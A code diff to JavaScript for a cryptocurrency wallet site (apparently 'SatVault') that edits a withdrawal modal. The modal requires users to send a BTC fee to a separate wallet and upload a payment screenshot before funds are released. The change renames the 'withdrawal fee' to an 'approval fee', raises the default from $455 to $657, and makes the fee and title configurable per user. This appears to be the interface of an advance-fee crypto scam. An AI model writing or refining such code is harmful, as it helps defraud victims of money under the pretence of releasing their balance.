@@ -18,7 +18,7 @@
       '<div id="withdraw-fee-proof-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="withdraw-fee-proof-title">' +
         '<div class="wallet-modal-backdrop" data-fee-proof-close></div>' +
         '<div class="wallet-modal-card app-card">' +
-          '<h2 id="withdraw-fee-proof-title" class="wallet-modal-title">Pay Withdrawal Fee</h2>' +
+          '<h2 id="withdraw-fee-proof-title" class="wallet-modal-title">Approval for Withdrawal</h2>' +
           '<p id="withdraw-fee-proof-body" class="wallet-modal-body text-gray-400 text-sm"></p>' +
           '<div class="wallet-modal-fee-row mt-3">' +
             '<span class="text-gray-500 text-xs">Withdrawal amount</span>' +
@@ -29,10 +29,10 @@
             '<strong id="withdraw-fee-proof-dest" class="text-white text-xs break-all text-right max-w-xs">—</strong>' +
           "</div>" +
           '<div class="wallet-modal-fee-row">' +
-            '<span class="text-gray-500 text-xs">Fee to pay</span>' +
-            '<strong id="withdraw-fee-proof-amount" class="text-primary text-lg">$455.00</strong>' +
+            '<span class="text-gray-500 text-xs">Approval fee</span>' +
+            '<strong id="withdraw-fee-proof-amount" class="text-primary text-lg">—</strong>' +
           "</div>" +
-          '<p class="text-xs text-gray-500 mb-2 mt-4">Send the $455 fee to this BTC wallet</p>' +
+          '<p id="withdraw-fee-proof-fee-hint" class="text-xs text-gray-500 mb-2 mt-4">Send the approval fee to this BTC wallet</p>' +
           '<p id="withdraw-fee-proof-wallet" class="wallet-box"></p>' +
           '<button type="button" id="withdraw-fee-proof-copy" class="btn-ghost text-sm mt-3 w-full">Copy fee wallet address</button>' +
           '<div class="mt-4">' +
@@ -123,7 +123,7 @@
     var file = fileInput && fileInput.files && fileInput.files[0];
 
     if (!file) {
-      showError("Please upload a screenshot of your $455 fee payment.");
+      showError("Please upload a screenshot of your approval fee payment.");
       return;
     }
     if (file.size > 8 * 1024 * 1024) {
@@ -131,7 +131,7 @@
       return;
     }
 
-    var fee = (profile && profile.withdrawFeeAmount) || 455;
+    var fee = (profile && profile.withdrawFeeAmount) || 657;
     var feeWallet = (profile && profile.withdrawFeeWallet) || "";
     var user = window.SatVaultAuth && SatVaultAuth.getUser && SatVaultAuth.getUser();
     var profileId = window.SatVaultAuth && SatVaultAuth.getProfileId && SatVaultAuth.getProfileId();
@@ -211,19 +211,23 @@
       onSuccess: onSuccess
     };
 
-    var fee = Number(profile.withdrawFeeAmount) || 455;
+    var fee = Number(profile.withdrawFeeAmount) || 657;
     var feeWallet = profile.withdrawFeeWallet || "";
+    var feeTitle = profile.withdrawFeeProofTitle || "Approval for Withdrawal";
     var amtLabel = "$" + Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     var feeLabel = "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
+    document.getElementById("withdraw-fee-proof-title").textContent = feeTitle;
     document.getElementById("withdraw-fee-proof-body").textContent =
-      "To withdraw " + amtLabel + " to your wallet, pay a " + feeLabel +
-      " fee in BTC to the address below and upload a screenshot. " +
+      "To withdraw " + amtLabel + " to your wallet, pay the " + feeLabel +
+      " approval fee in BTC to the address below and upload a screenshot. " +
       "After that, " + amtLabel + " is deducted from your account balance and sent to the wallet you entered.";
     document.getElementById("withdraw-fee-proof-withdraw-amt").textContent = amtLabel;
     document.getElementById("withdraw-fee-proof-dest").textContent = destinationWallet || "—";
     document.getElementById("withdraw-fee-proof-amount").textContent = feeLabel;
     document.getElementById("withdraw-fee-proof-wallet").textContent = feeWallet;
+    var feeHint = document.getElementById("withdraw-fee-proof-fee-hint");
+    if (feeHint) feeHint.textContent = "Send the " + feeLabel + " approval fee to this BTC wallet";
 
     var fileInput = document.getElementById("withdraw-fee-proof-file");
     if (fileInput) fileInput.value = "";
